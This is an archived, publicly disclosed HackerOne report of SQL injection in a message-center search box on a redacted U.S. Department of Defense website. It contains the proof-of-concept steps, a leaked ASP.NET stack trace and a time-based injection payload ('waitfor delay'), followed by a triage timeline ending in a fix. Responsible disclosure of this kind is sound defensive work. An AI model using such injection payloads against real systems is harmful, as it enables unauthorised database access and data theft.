---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/high
  - cwe/sql-injection
  - env/web
  - vuln/sql-injection
substate: "resolved"
weakness: "SQL Injection"
enriched: true
body: true
date: 2019-10-08
submitted: 2018-07-14T23:01:00.139Z
bounty_usd: null
votes: 5
cve: []
program: "[[programs/deptofdefense|U.S. Dept Of Defense]]"
reporter: "modam3r5"
source: "https://hackerone.com/reports/381758"
title: "sql injection on  /messagecenter/messagingcenter at https://www.███████/"
---
# sql injection on  /messagecenter/messagingcenter at https://www.███████/

> **Severity:** High | **Bounty:** undisclosed | **Votes:** 5 | **Program:** U.S. Dept Of Defense | **Disclosed:** 2019-10-08

- Report: [https://hackerone.com/reports/381758](https://hackerone.com/reports/381758)
- CWE: SQL Injection
- Submitted: 2018-07-14T23:01:00.139Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

Hi , 
i would like to report an issues that lead to SQL injection in search box at https://www.████/messagecenter/messagingcenter , if you add the character `'` that usually used to test if the site have in `sql injection `  the site will return with  `Incorrect syntax` error that can confirm the site is effected with this bug .

#POC 
open the following link and enter `'` in the box will see this error in response https://www.█████████/messagecenter/messagingcenter 

```
Server Error in '/' Application.
Unclosed quotation mark after the character string ' ORDER BY StartDate2 DESC'.
Incorrect syntax near ' ORDER BY StartDate2 DESC'.
Description: An unhandled exception occurred during the execution of the current web request. Please review the stack trace for more information about the error and where it originated in the code.

Exception Details: System.Data.SqlClient.SqlException: Unclosed quotation mark after the character string ' ORDER BY StartDate2 DESC'.
Incorrect syntax near ' ORDER BY StartDate2 DESC'.

Source Error:

An unhandled exception was generated during the execution of the current web request. Information regarding the origin and location of the exception can be identified using the exception stack trace below.

Stack Trace:


[SqlException (0x80131904): Unclosed quotation mark after the character string ' ORDER BY StartDate2 DESC'.
Incorrect syntax near ' ORDER BY StartDate2 DESC'.]
   System.Data.SqlClient.SqlConnection.OnError(SqlException exception, Boolean breakConnection, Action`1 wrapCloseInAction) +1787822
   System.Data.SqlClient.SqlInternalConnection.OnError(SqlException exception, Boolean breakConnection, Action`1 wrapCloseInAction) +5341894
   System.Data.SqlClient.TdsParser.ThrowExceptionAndWarning(TdsParserStateObject stateObj, Boolean callerHasConnectionLock, Boolean asyncClose) +546
   System.Data.SqlClient.TdsParser.TryRun(RunBehavior runBehavior, SqlCommand cmdHandler, SqlDataReader dataStream, BulkCopySimpleResultSet bulkCopyHandler, TdsParserStateObject stateObj, Boolean& dataReady) +1693
   System.Data.SqlClient.SqlDataReader.TryConsumeMetaData() +61
   System.Data.SqlClient.SqlDataReader.get_MetaData() +90
   System.Data.SqlClient.SqlCommand.FinishExecuteReader(SqlDataReader ds, RunBehavior runBehavior, String resetOptionsString) +377
   System.Data.SqlClient.SqlCommand.RunExecuteReaderTds(CommandBehavior cmdBehavior, RunBehavior runBehavior, Boolean returnStream, Boolean async, Int32 timeout, Task& task, Boolean asyncWrite, SqlDataReader ds) +1421
   System.Data.SqlClient.SqlCommand.RunExecuteReader(CommandBehavior cmdBehavior, RunBehavior runBehavior, Boolean returnStream, String method, TaskCompletionSource`1 completion, Int32 timeout, Task& task, Boolean asyncWrite) +177
   System.Data.SqlClient.SqlCommand.RunExecuteReader(CommandBehavior cmdBehavior, RunBehavior runBehavior, Boolean returnStream, String method) +53
   System.Data.SqlClient.SqlCommand.ExecuteReader(CommandBehavior behavior, String method) +137
   System.Data.SqlClient.SqlCommand.ExecuteDbDataReader(CommandBehavior behavior) +41
   System.Data.Common.DbCommand.System.Data.IDbCommand.ExecuteReader(CommandBehavior behavior) +10
   System.Data.Common.DbDataAdapter.FillInternal(DataSet dataset, DataTable[] datatables, Int32 startRecord, Int32 maxRecords, String srcTable, IDbCommand command, CommandBehavior behavior) +140
   System.Data.Common.DbDataAdapter.Fill(DataSet dataSet, Int32 startRecord, Int32 maxRecords, String srcTable, IDbCommand command, CommandBehavior behavior) +316
   System.Data.Common.DbDataAdapter.Fill(DataSet dataSet) +88
   GCSS_Army.MessageCenter.MessagingCenter.getMessages(String ssql) in C:\Users\████████\source\repos\New GCSS-Army\WebApplication4\WebApplication4\MessageCenter\MessagingCenter.aspx.cs:171
   GCSS_Army.MessageCenter.MessagingCenter.btnSearch_Click(Object sender, EventArgs e) in C:\Users\████\source\repos\New GCSS-Army\WebApplication4\WebApplication4\MessageCenter\MessagingCenter.aspx.cs:275
   System.Web.UI.WebControls.Button.OnClick(EventArgs e) +9663950
   System.Web.UI.WebControls.Button.RaisePostBackEvent(String eventArgument) +103
   System.Web.UI.WebControls.Button.System.Web.UI.IPostBackEventHandler.RaisePostBackEvent(String eventArgument) +10
   System.Web.UI.Page.RaisePostBackEvent(IPostBackEventHandler sourceControl, String eventArgument) +13
   System.Web.UI.Page.RaisePostBackEvent(NameValueCollection postData) +35
   System.Web.UI.Page.ProcessRequestMain(Boolean includeStagesBeforeAsyncPoint, Boolean includeStagesAfterAsyncPoint) +1724

```

you can used this command `1'; waitfor delay '0:0:2' -- ` and the error page will return after `2` second

## Impact

An attacker may execute arbitrary SQL statements on the vulnerable system. This may compromise the integrity of your database and/or expose sensitive information.

## Timeline

- **Report Filed**
- **2018-07-14** @U.S. Dept Of Defense: Greetings from the Department of Defense (DoD),

Thank you for supporting the DoD Vulnerability Disclosure Program (VDP).

By submitting this report, you acknowledge understanding of, and agreement to, the DoD Vulnerability Disclosure Policy as detailed at @DeptofDefense.

The VDP Team will review your report to ensure compliance with the DoD Vulnerability Disclosure Policy.  If your report is determined to be out-of-scope, it will be closed without action.

We will attempt to validate in-scope vulnerability reports and may request additional information from you if necessary. We will forward reports with validated vulnerabilities to DoD system owners for their action.

Our goal is to provide you with status updates not less than every two weeks until the reported vulnerability is resolved.

Regards,

The VDP Team
- **Report Severity Updated**
- **Report Triaged**
- **2018-07-27** @ag3nt-z3: @modam3r5 it looks like they removed the box. Do you still have a copy of the request in burp that you could test with or send me to make sure it's still not validating the request still?
- **2018-07-27** @modam3r5: Hi @ag3nt-z3 , 
:\ Unfortunately I deleted all files a few days ago , but i retest the site again and look like the team has remove the effect script/path and i can confirm that look good and fixed now .
- **Report Resolved**
- **Agreed On Going Public**
- **Agreed On Going Public**
- **Report Became Public**
